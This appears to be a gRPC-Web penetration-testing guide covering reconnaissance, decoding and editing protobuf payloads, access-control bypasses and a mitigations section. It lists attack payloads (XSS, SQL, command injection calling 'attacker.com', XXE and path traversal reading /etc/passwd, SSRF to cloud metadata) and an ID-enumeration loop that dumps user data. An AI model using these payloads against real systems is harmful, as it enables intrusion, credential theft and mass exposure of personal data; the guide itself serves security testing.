## 1. Overview

**What is gRPC-Web?**

gRPC-Web is a JavaScript implementation of gRPC for browser clients, enabling web applications to communicate with gRPC services. It uses a specialized protocol that differs from standard HTTP/REST APIs.

**Key Technical Characteristics:**

- **Content-Type**: `application/grpc-web-text`
- **Payload Format**: Protocol Buffers (protobuf) encoded in base64
- **Communication Pattern**: Client-server RPC (Remote Procedure Call)
- **Transport**: HTTP/1.1 or HTTP/2

**Why It Matters for Security:**

- Obfuscated payload structure makes manual analysis challenging
- JavaScript files often expose service definitions, endpoints, and message schemas
- Less common than REST APIs, so developers may overlook security best practices
- Standard web security tools need adaptation for gRPC-Web testing

---

## 2. Exploitation Methods

### 🔍 Phase 1: Reconnaissance & Service Discovery

**Objective:** Map the gRPC-Web attack surface

**Action Steps:**

1. **Identify gRPC-Web Usage**
    
    ```bash
    # Look for these indicators in HTTP traffic:
    Content-Type: application/grpc-web-text
    Content-Type: application/grpc-web+proto
    ```
    
2. **Locate JavaScript Service Files**
    
    - Search for `*_grpc_web_pb.js` or similar naming patterns
    - Check common paths: `/static/js/`, `/assets/`, `/dist/`
    - Review page source and network requests
3. **Extract Service Definitions**
    
    Use [gRPC-Scan](https://github.com/nxenon/grpc-pentest-suite):
    
    ```bash
    # Download the JavaScript gRPC-Web file
    wget https://target.com/main.js
    
    # Scan for endpoints and message structures
    python3 grpc-scan.py --file main.js
    ```
    
    **Expected Output:**
    
    - Service endpoints (e.g., `/grpc.service.UserService/GetUser`)
    - Message field names and types
    - Field numbers for protobuf encoding
4. **Build Your Target Map**
    
    Document discovered elements:
    
    - ✅ All available endpoints
    - ✅ Request/response message schemas
    - ✅ Field types (string, int, bool, float)
    - ✅ Field numbers for crafting payloads

---

### 🎯 Phase 2: Payload Manipulation & Testing

**Objective:** Decode, modify, and test gRPC-Web requests

#### Method A: Command-Line Workflow

**Tools Required:**

- [grpc-coder](https://github.com/nxenon/grpc-pentest-suite)
- protoscope

**Step-by-Step Process:**

1. **Capture & Decode Request**
    
    ```bash
    # Intercept base64-encoded payload from Burp/proxy
    echo "AAAAABYSC0FtaW4gTmFzaXJpGDY6BVhlbm9u" | \
    python3 grpc-coder.py --decode --type grpc-web-text | \
    protoscope > decoded.txt
    ```
    
2. **Analyze Decoded Structure**
    
    ```bash
    cat decoded.txt
    # Example output:
    # 2: {"Amin Nasiri"}
    # 3: 54
    # 7: {"Xenon"}
    ```
    
3. **Modify Payload for Testing**
    
    ```bash
    nano decoded.txt
    ```
    
    **Test Variations:**
    
    ```
    # Original
    2: {"username"}
    3: 25
    
    # XSS Test
    2: {"<script>alert(origin)</script>"}
    3: 25
    
    # SQLi Test
    2: {"admin' OR '1'='1"}
    3: 25
    
    # IDOR Test
    3: 9999
    
    # Privilege Escalation Test
    4: true  # If field 4 is "isAdmin"
    ```
    
4. **Re-encode Modified Payload**
    
    ```bash
    protoscope -s decoded.txt | \
    python3 grpc-coder.py --encode --type grpc-web-text
    ```
    
5. **Send via Interceptor**
    
    - Paste encoded payload into Burp Suite Repeater
    - Observe response for anomalies
    - Check for: error messages, reflected input, privilege changes, data leakage

---

#### Method B: Burp Suite Extension (Recommended)

**Setup:**

1. Install [gRPC-Web Pentest Suite](https://github.com/nxenon/grpc-pentest-suite) Burp extension
2. Load extension in Burp Suite Extender

**Workflow:**

- Automatic detection of gRPC-Web traffic
- Visual message editor within Burp
- One-click encode/decode
- Seamless integration with Intruder, Repeater, and Scanner

**Pro Tip:** Use the extension for rapid iteration during active testing sessions.

---

### 🚀 Phase 3: Vulnerability Testing Checklist

**Systematic Testing Approach:**

- [ ] **Injection Attacks**
    
    - XSS in string fields
    - SQL injection in database-bound parameters
    - Command injection if server processes input
    - NoSQL injection for MongoDB/similar backends
- [ ] **Access Control Issues**
    
    - IDOR by manipulating ID fields
    - Privilege escalation via boolean flags (isAdmin, isStaff)
    - Horizontal access by changing user identifiers
    - Missing function-level access control on sensitive endpoints
- [ ] **Business Logic Flaws**
    
    - Parameter tampering (prices, quantities, balances)
    - Race conditions in transaction endpoints
    - Bypass validation by modifying field order or types
- [ ] **Information Disclosure**
    
    - Verbose error messages revealing backend details
    - Enumerate users/resources through predictable IDs
    - Stack traces in responses
- [ ] **Rate Limiting & DoS**
    
    - Missing rate limits on endpoints
    - Resource exhaustion through large payloads
    - Server streaming abuse

---

## 3. Bypasses

### Authentication Bypass Techniques

**Scenario 1: Missing Server-Side Validation**

```
# Manipulate boolean fields
4: false  → 4: true  # isAuthenticated
5: 0      → 5: 1     # roleId (change to admin)
```

**Scenario 2: JWT/Token Manipulation**

- Test endpoint without authentication headers
- Modify token claims if JWT parsing is client-controlled
- Test endpoints discovered via JavaScript but not documented

**Scenario 3: Endpoint Discovery Bypass**

```
# Test undocumented endpoints from JS analysis
/grpc.internal.AdminService/DeleteUser
/grpc.testing.DebugService/GetConfig
```

---

### Input Validation Bypasses

**Type Confusion:**

```
# If server expects integer but accepts string
3: 25          # Normal
3: {"25"}      # May bypass validation
3: {"25admin"} # Edge case handling
```

**Field Number Manipulation:**

```
# Some parsers handle unknown fields differently
2: {"normalUser"}
999: {"adminOverride"}  # Undocumented field
```

---

## 4. Payloads

### Top 10 Modern gRPC-Web Test Payloads

**1. XSS - Modern JavaScript Context**

```
2: {"<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"}
```

**2. XSS - Polyglot**

```
2: {"'\"--></script><svg/onload=alert(document.domain)>"}
```

**3. SQL Injection - Boolean-Based**

```
2: {"admin' AND '1'='1"}
3: {"admin' AND '1'='2"}
```

**4. SQL Injection - Time-Based**

```
2: {"admin'; WAITFOR DELAY '0:0:5'--"}
```

**5. NoSQL Injection - MongoDB**

```
2: {"username": {"$ne": null}}
```

**6. Command Injection**

```
2: {"; curl attacker.com/$(whoami) ;"}
```

**7. Path Traversal**

```
2: {"../../../../etc/passwd"}
```

**8. SSTI (Server-Side Template Injection)**

```
2: {"{{7*7}}"}
2: {"${7*7}"}
```

**9. LDAP Injection**

```
2: {"*)(uid=*))(&(uid=*"}
```

**10. XXE (if XML processing exists)**

```
2: {"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
```

---

## 5. Higher Impact Scenarios

### Critical Vulnerability Patterns

**🔥 Scenario 1: Admin Privilege Escalation**

**Discovery Path:**

```javascript
// Found in JavaScript file
message UserRequest {
  string username = 1;
  int32 userId = 2;
  bool isAdmin = 3;  // ⚠️ Client-controlled admin flag
}
```

**Exploitation:**

```bash
# Normal request
2: {"regularuser"}
3: false

# Escalation attempt
2: {"regularuser"}
3: true  # Set isAdmin to true
```

**Impact:** Full administrative access, data breach, system compromise

---

**🔥 Scenario 2: Mass Data Exfiltration via IDOR**

**Discovery Path:**

```javascript
// Endpoint: /grpc.api.DataService/GetUserData
message DataRequest {
  int32 userId = 1;
}
```

**Exploitation:**

```bash
# Automated enumeration script
for i in {1..10000}; do
  echo "1: $i" | protoscope -s | \
  python3 grpc-coder.py --encode --type grpc-web-text | \
  curl -X POST https://target.com/grpc.api.DataService/GetUserData \
  -H "Content-Type: application/grpc-web-text" \
  --data-binary @- >> exfil.txt
done
```

**Impact:** Complete database dump, PII exposure, compliance violations

---

**🔥 Scenario 3: Server-Side Request Forgery (SSRF)**

**Discovery Path:**

```javascript
message FetchRequest {
  string url = 1;
  string callback = 2;
}
```

**Exploitation:**

```bash
1: {"http://169.254.169.254/latest/meta-data/"}  # AWS metadata
1: {"http://internal-admin-panel.local/"}        # Internal services
1: {"file:///etc/passwd"}                         # Local file access
```

**Impact:** Cloud credential theft, internal network access, RCE

---

**🔥 Scenario 4: Authentication Bypass via Service Enumeration**

**Discovery Path:**

```bash
# grpc-scan.py reveals hidden endpoints
/grpc.internal.AuthService/CreateAdminToken
/grpc.debug.TestService/BypassAuth
```

**Exploitation:**

```bash
# Test unauthenticated access to debug endpoints
curl -X POST https://target.com/grpc.debug.TestService/BypassAuth \
-H "Content-Type: application/grpc-web-text" \
--data-binary "AAAAAAA="
```

**Impact:** Complete authentication bypass, unauthorized access

---

## 6. Mitigations

### For Security Teams & Developers

**🛡️ Server-Side Validation**

- ✅ Never trust client-supplied data
- ✅ Validate all fields against expected types, ranges, and formats
- ✅ Implement server-side authorization checks for every endpoint
- ✅ Ignore unknown/unexpected protobuf fields

**🛡️ Access Control**

- ✅ Enforce principle of least privilege
- ✅ Implement function-level access control
- ✅ Use server-side session management, not client-side flags
- ✅ Validate user permissions on every request

**🛡️ Secure Configuration**

- ✅ Disable debug/test endpoints in production
- ✅ Remove unnecessary service definitions from JavaScript bundles
- ✅ Implement rate limiting on all endpoints
- ✅ Use authentication on all non-public services

**🛡️ Input Sanitization**

- ✅ Escape output for XSS prevention
- ✅ Use parameterized queries for SQL operations
- ✅ Validate and sanitize all string inputs
- ✅ Implement content security policy (CSP)

**🛡️ Monitoring & Logging**

- ✅ Log all gRPC-Web requests with user context
- ✅ Alert on unusual patterns (rapid enumeration, privilege changes)
- ✅ Monitor for reconnaissance activities
- ✅ Implement anomaly detection

**🛡️ Code Review Checklist**

- ✅ Verify no sensitive logic in JavaScript files
- ✅ Check for hardcoded credentials or API keys
- ✅ Ensure proper error handling (no stack traces to client)
- ✅ Review all boolean fields for authorization bypass risks

---

## 🎯 Quick Reference Tools

**Essential Toolkit:**

- [gRPC Pentest Suite](https://github.com/nxenon/grpc-pentest-suite) - Complete gRPC-Web testing framework
- [grpc-coder](https://github.com/nxenon/grpc-pentest-suite) - Encode/decode payloads
- [gRPC-Scan](https://github.com/nxenon/grpc-pentest-suite) - JavaScript analysis
- Burp Suite - Traffic interception and manipulation
- protoscope - Protobuf message inspection

**Further Reading:**

- [Hacking into gRPC-Web Article by Amin Nasiri](https://infosecwriteups.com/hacking-into-grpc-web-a54053757a45)
- [gRPC-Web Pentest Suite Documentation](https://github.com/nxenon/grpc-pentest-suite)

---

**💪 Motivation Boost:** You're now equipped with a complete gRPC-Web pentesting methodology! Start with reconnaissance, systematically test each discovery, and document everything. Every endpoint analyzed is progress toward comprehensive security assessment. Keep pushing forward! 🚀